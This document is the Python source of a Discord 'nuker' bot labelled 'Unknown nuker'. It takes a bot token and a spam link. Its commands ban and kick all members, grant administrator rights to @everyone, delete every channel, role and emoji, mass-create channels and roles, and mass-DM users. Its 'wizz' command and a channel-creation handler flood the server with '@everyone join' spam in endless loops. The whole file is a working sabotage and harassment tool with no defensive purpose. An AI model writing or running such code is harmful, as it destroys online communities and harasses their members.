import discord
import asyncio
import colorama 
import json
from discord.ext import commands
import os
import random 
#from discord import Webhook, AsyncWebhookAdapter
from discord import Permissions
import requests
from colorama import Fore, Style, Back
import time
import json

colorama.init(autoreset=True)
Title = f"unknown . nukez"
print('')
print(f"{Fore.BLUE}            ╱╱╱╱╱╱╭╮")
print(f"{Fore.CYAN}            ╱╱╱╱╱╱┃┃")
print(f"{Fore.GREEN}            ╭╮╭┳━╮┃┃╭┳━╮╭━━┳╮╭╮╭┳━╮      ")
print(f"{Fore.LIGHTBLUE_EX}            ┃┃┃┃╭╮┫╰╯┫╭╮┫╭╮┃╰╯╰╯┃╭╮╮     ")
print(f"{Fore.LIGHTCYAN_EX}            ┃╰╯┃┃┃┃╭╮┫┃┃┃╰╯┣╮╭╮╭┫┃┃┃╭╮     ")
print(f"{Fore.LIGHTGREEN_EX}            ╰━━┻╯╰┻╯╰┻╯╰┻━━╯╰╯╰╯╰╯╰╯╰╯     ")
print(f"{Fore.LIGHTWHITE_EX}                       ─────╔╗──╔═╗      ")
print(f"{Fore.LIGHTGREEN_EX}                       ╔═╦╦╦╣╠╦═╬═║      ")
print(f"{Fore.LIGHTCYAN_EX}                       ║║║║║║═╣╩╣═╣")
print(f"{Fore.LIGHTBLUE_EX}                       ╚╩═╩═╩╩╩═╩═╝     ")
print(f"{Fore.LIGHTWHITE_EX}            ")
print('')
colorama.init(autoreset=True)
print(f"""             {Fore.BLUE}P{Fore.CYAN}R{Fore.GREEN}E{Fore.LIGHTBLUE_EX}F{Fore.LIGHTCYAN_EX}I{Fore.LIGHTGREEN_EX}X {Fore.LIGHTCYAN_EX}>> """)
input_var=input("              ")
prefix = (input_var)
colorama.init(autoreset=True)
print(f"""               {Fore.BLUE}T{Fore.CYAN}o{Fore.GREEN}k{Fore.LIGHTBLUE_EX}e{Fore.LIGHTCYAN_EX}n{Fore.LIGHTGREEN_EX} >> """)
input_var2=input("             ")
token = (input_var2)
colorama.init(autoreset=True)

print(f"""               {Fore.BLUE}s{Fore.CYAN}t{Fore.GREEN}a{Fore.LIGHTBLUE_EX}t{Fore.LIGHTCYAN_EX}us{Fore.LIGHTGREEN_EX} >> """)
input_var4=input("             ")
colorama.init(autoreset=True)
print(f"""               {Fore.BLUE}se{Fore.CYAN}rv{Fore.GREEN}er{Fore.LIGHTBLUE_EX} li{Fore.LIGHTCYAN_EX}nk {Fore.LIGHTWHITE_EX}[link you want to spam]{Fore.LIGHTGREEN_EX} >> """)
input_var5=input("             ")
link = (input_var5)   
if token == "discord.errors.LoginFailure":
  print(f"               {Fore.BLUE}wr{Fore.CYAN}on{Fore.GREEN}g t{Fore.LIGHTBLUE_EX}ok{Fore.LIGHTCYAN_EX}en {Fore.LIGHTGREEN_EX} pa{Fore.LIGHTWHITE_EX}ss{Fore.LIGHTGREEN_EX}ed")
 
       
client = commands.Bot(command_prefix=(prefix), intents = discord.Intents.all())






STATUS = (input_var4)
lol = [" op", " on top", " wizzed u", " fucked u", " says haha"]
hi = random.choice(lol)
MESSAGE_CONTENTS = ["@everyone join ", "@everyone join XD "]
WEBHOOK_NAMES = ['UNKNOWN.nukez','XD']
BAN_REASON = ['unknown.nukez', 'unknown op']



client.remove_command('help')

                                         







@client.command()
async def ban(ctx):
        await ctx.message.delete()
        for member in ctx.guild.members:
         if member.id != 983946996354252830:
          for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print (f"{user.name} Was Banned")
            except:
                pass


@client.command()
async def dmall(ctx, *, message:str):
  await ctx.message.delete()
  for channel in client.private_channels:
    try:
      await channel.send(f"{message}")
      print("Message Sent To {channel}")
    except:
      print("Message Not Sent To {channel}")



@client.command(pass_context=True)
async def admin(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
             if role.name == '@everyone':
                  try:
                      await role.edit(permissions=Permissions.all())
                      print("@everyone has admin") 
                  except:
                      print("Failed to give everyone admin")


  
  
 

@client.event
async def on_connect():
  await client.change_presence(activity=discord.Game       (name= (STATUS)))
  os.system("cls")
  print('')
  print(f"{Fore.BLUE}             ╱╱╱╱╱╱╭╮")
  print(f"{Fore.CYAN}            ╱╱╱╱╱╱┃┃")
  print(f"{Fore.GREEN}            ╭╮╭┳━╮┃┃╭┳━╮╭━━┳╮╭╮╭┳━╮      ")
  print(f"{Fore.LIGHTBLUE_EX}            ┃┃┃┃╭╮┫╰╯┫╭╮┫╭╮┃╰╯╰╯┃╭╮╮     ")
  print(f"{Fore.LIGHTCYAN_EX}            ┃╰╯┃┃┃┃╭╮┫┃┃┃╰╯┣╮╭╮╭┫┃┃┃╭╮     ")
  print(f"{Fore.LIGHTGREEN_EX}            ╰━━┻╯╰┻╯╰┻╯╰┻━━╯╰╯╰╯╰╯╰╯╰╯     ")
  print(f"{Fore.LIGHTWHITE_EX}                       ─────╔╗──╔═╗      ")
  print(f"{Fore.LIGHTGREEN_EX}                       ╔═╦╦╦╣╠╦═╬═║      ")
  print(f"{Fore.LIGHTCYAN_EX}                       ║║║║║║═╣╩╣═╣")
  print(f"{Fore.LIGHTBLUE_EX}                       ╚╩═╩═╩╩╩═╩═╝     ")
  print(f"{Fore.LIGHTWHITE_EX}            ")
  print('')

  txt = f"                    {Fore.LIGHTMAGENTA_EX}logged in as "
  for letter in txt:
    print(letter, end="", flush=True)
    time.sleep(0.1)
    
  print(f"\n                    {Fore.LIGHTCYAN_EX}{client.user}")
  txt = f"                      {Fore.BLUE}P{Fore.CYAN}R{Fore.GREEN}E{Fore.LIGHTBLUE_EX}F{Fore.LIGHTCYAN_EX}I{Fore.LIGHTGREEN_EX}X {Fore.LIGHTCYAN_EX}is"
  for letter in txt:
    print(letter, end="", flush=True)
    time.sleep(0.1)
 
  print(f"\n                        {Fore.LIGHTBLUE_EX}"+(prefix))



@client.command(pass_context=True)
async def name(ctx, *, name):
  await ctx.message.delete()
  await ctx.guild.edit(name=name)

@client.command(pass_context=True)
async def emojidel(ctx):
 await ctx.message.delete()
 for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"{emoji.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")

@client.command()
async def roles(ctx, *, name):
  await ctx.message.delete()
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=name)
      print("Created Roles")
    except:
        print ("Failed To Create Role")

@client.command()
async def category(ctx, *, name):
  await ctx.message.delete()
  for i in range(1, 250):
    try:
      await ctx.guild.create_category(name=name)
      print("Created Category")
    except:
        print ("Failed To Create category")

@client.command()
async def channels(ctx, *, name):
  await ctx.message.delete()
  for i in range(1, 250):
    try:
      await ctx.guild.create_text_channel(name=name)
      print("Created Channel")
    except:
        print ("Failed To Create channel")
@client.command()
async def vc(ctx, *, name):
  await ctx.message.delete()
  for i in range(1, 250):
    try:
      await ctx.guild.create_voice_channel(name=name)
      print("Created Channel")
    except:
        print ("Failed To Create channel")


  
@client.command()
async def wizz(ctx, *, name,amount=50):
  await ctx.guild.edit(name= name)
  channels = ctx.guild.channels
  for channel in channels:
    try:
      await channel.delete()
      print(channel.name + " Has been wizzed")
    except:
        pass
        print ("error")
        guild = ctx.message.guild
  for i in range(amount):
    try:  
      await ctx.guild.create_text_channel(name+random.choice(lol))
      print(f"[{i}] channels made")
    except:
      print("error making channels")
  for role in ctx.guild.roles:
    try:
      await role.delete()
      print(f"{role.name} deleted")
    except:
      print(f"{role.name} not deleted")
  await asyncio.sleep(2)
  for i in range(100):  
    for i in range(1000):
      for channel in ctx.guild.channels:
        try:
          await channel.send("@everyone join "+link)
          print(f"{channel.name} spammed")
        except:
          print(f"{channel.name} not spammed")
    for member in ctx.guild.members:
      if member.id != 983946996354252830:  
        try:
          await member.ban(reason= random.choice(BAN_REASON))
          print(f"{member.name} banned from {ctx.guild.name}")
        except:
          print(f"{member.name} not banned from {ctx.guild.name}") 
          
        
@client.event
async def on_guild_channel_create(channel):
  webhook =await channel.create_webhook(name = random.choice(WEBHOOK_NAMES))  
  while True:  
    await channel.send(random.choice(MESSAGE_CONTENTS))
    await webhook.send(random.choice(MESSAGE_CONTENTS), username=random.choice(WEBHOOK_NAMES))
@client.command()
async def kick(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.kick(reason= random.choice(BAN_REASON))
      print(member.name + "Has Been Kicked")
    except:
      print(member.name + "Has Not Been Kicked")

@client.command()
async def status(ctx, *, x):
    await ctx.message.delete()
    await client.change_presence(
        activity=discord.Streaming(name=x, url="https://twitch.tv/unknown 783__"))
@client.command(pass_context=True)

async def nick(ctx, rename_to):
    await ctx.message.delete()
    for member in list(client.get_all_members()):
        try:
            await member.edit(nick=rename_to)
            print (f"{member.name} has been renamed to {rename_to}")
        except:
            print (f"{member.name} has NOT been renamed")
        print("Action completed: Rename all")

@client.command()
async def stop(ctx):
  await ctx.reply('> **Logged Out | Shut down successfully**')
  await client.close()

@client.command()
async def delall(ctx):
    # LOL
    print('Deleting all...')
    
    print('Deleting channels..')
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except discord.Forbidden:
            print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
        except discord.HTTPException:
            print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
        else:
            print(f"{channel.name} has been deleted in {ctx.guild.name}")
        
    print('Deleting roles..')
    for role in ctx.guild.roles:

        if str(role) == '@everyone':
            continue

        try:
            await role.delete()
        except discord.Forbidden:
            print(f"{role.name} has NOT been deleted in {ctx.guild.name}")
        else:
            print(f"{role.name} has been deleted in {ctx.guild.name}")
            
    print('Deleting emojis..')
    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
        except discord.Forbidden:
            print(f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
        else:
            print(f"{emoji.name} has been deleted in {ctx.guild.name}")
            
    print("Action Completed: dall all")

@client.command()
async def editall(ctx, *, x):
    # LOL
    print('Renaming all...')
    
    print('Renaming channels..')
    for channel in ctx.guild.channels:
        try:
            await channel.edit(name=x)
        except discord.Forbidden:
            print(f"{channel.name} has NOT been edited in {ctx.guild.name}")
        except discord.HTTPException:
            print(f"{channel.name} has NOT been edited in {ctx.guild.name}")
        else:
            print(f"{channel.name} has been edited in {ctx.guild.name}")
        
    print('Renaming roles..')
    for role in ctx.guild.roles:

        if str(role) == '@everyone':
            continue

        try:
            await role.edit(name=x)
        except discord.Forbidden:
            print(f"{role.name} has NOT been edited in {ctx.guild.name}")
        else:
            print(f"{role.name} has been edited in {ctx.guild.name}")

    print("Action Completed: dall all")
  

@client.command(pass_context=True)
async def channeldel(ctx):
 await ctx.message.delete()
 for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
                print (f"{channel.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{channel.name} has NOT been deleted in {ctx.guild.name}")

@client.command(pass_context=True)
async def roledel(ctx):
 await ctx.message.delete()
 for role in list(ctx.guild.roles):
            try:
                await role.delete()
                print (f"{role.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{role.name} has NOT been deleted in {ctx.guild.name}")


@client.command(pass_context=True)
async def ping(ctx):
    await ctx.message.delete()
    member = ctx.message.author
    channel = ctx.message.channel
    t1 = time.perf_counter()
    await channel.trigger_typing()
    t2 = time.perf_counter()
    embed=discord.Embed(title=None, description='Ping: {}'.format(round((t2-t1)*1000)), color=0x2874A6)
    await member.send(embed=embed)
    print("Action completed: Server ping")
#############################

####INFO COMMAND####
@client.command(pass_context=True)
async def userinfo(ctx, member: discord.Member=None):
    await ctx.message.delete()
    member = ctx.message.author
    channel = ctx.message.channel
    if member is None:
        pass
    else:
        await channel.send("**The user's name is: {}**".format(member.name) + "\n**The user's ID is: {}**".format(member.id) + "\n**The user's current status is: {}**".format(member.status) + "\n**The user's highest role is: {}**".format(member.top_role) + "\n**The user joined at: {}**".format(member.joined_at))
    print("Action completed: User Info")
#############################   
@client.command('role')
async def role(ctx, user : discord.Member, *, role : discord.Role):
  await ctx.message.delete()
  if role in user.roles:
      await user.remove_roles(role) #removes the role if user already has
      await ctx.send(f"Removed {role} from {user.mention}")
  else:
      await user.add_roles(role) #adds role if not already has it
      await ctx.send(f"Added {role} to {user.mention}")
  
@client.command()
async def serverroles(ctx, *args):
        guild = ctx.guild
        roles = [role for role in guild.roles if role != ctx.guild.default_role]
        embed = discord.Embed(title="Server Roles", description=f"\n ".join([role.mention for role in roles]))
        await ctx.send(embed=embed)


@client.command()
async def help(ctx, *args):
    await ctx.message.delete()
    await ctx.send('** 📬 | PLS CHECK YOUR DM. `If you didnt get anything try again after opening you dm`**')
    retStr = str("```fix\n❄️wizz <your name> - nukes server\n\nban - banall (non threaded)\n\nkick - kickall\n\nroles <name> - spams roles\n\nemojidel - deletes emojis\n\ndmall - dms everyone in guild\n\nname <name> - changes guild name\n\nadmin - gives all admin\n\ncategory <name>  - Create categories\n\nchannels <name>  - create channels\n\nvc <name>  - create voice channels\n\nstatus <name> - change the status to the given object\n\nnick <name> - rename everyone in the server\n\nstop - stop the process\n\nroledel - Delete all roles\n\nchanneldel - Delete all channels\n\server - show server info\n\ndelall - delete all channels, emojis, roles\n\nping - show the bot's ping in ms\n\nuserinfo [username/Id] - show info of the user\n\server - shows server's info\n\nrole [Username/ID] [Role/ID] - give role to the specific user (permissions No need)\n\neditall  <name>  - Rename all channels and Roles\n\nserverroles - show all server roles ```""")
    embed = discord.Embed(color=0xfffafa,title="Discord Nuker By Unknown, Click on me to get the original code", url='https://replit.com/@SayemHackerz/Best-UnKnOwNs-Nuker?v=1')
    embed.add_field(name="Help Panel",value=retStr)
    embed.set_footer(text='create by UNKNOWN NUKER')

    await ctx.author.send(embed=embed)

@client.command()
async def server(ctx):
    embed = discord.Embed(title=f"{ctx.guild.name} Info", description="Information of this Server", color=discord.Colour.blue())
    embed.add_field(name='🆔Server ID', value=f"{ctx.guild.id}", inline=True)
    embed.add_field(name='📆Created On', value=ctx.guild.created_at.strftime("%b %d %Y"), inline=True)
    embed.add_field(name='👑Owner', value=f"{ctx.guild.owner.mention}", inline=True)
    embed.add_field(name='👥Members', value=f'{ctx.guild.member_count} Members', inline=True)
    embed.add_field(name='💬Channels', value=f'{len(ctx.guild.text_channels)} Text | {len(ctx.guild.voice_channels)} Voice', inline=True)
    embed.add_field(name='🌎Region', value=f'{ctx.guild.region}', inline=True)
    embed.set_thumbnail(url=ctx.guild.icon_url) 
    embed.set_footer(text="☣️ Unknown nuker")    

    await ctx.send(embed=embed)
  
client.run(token)



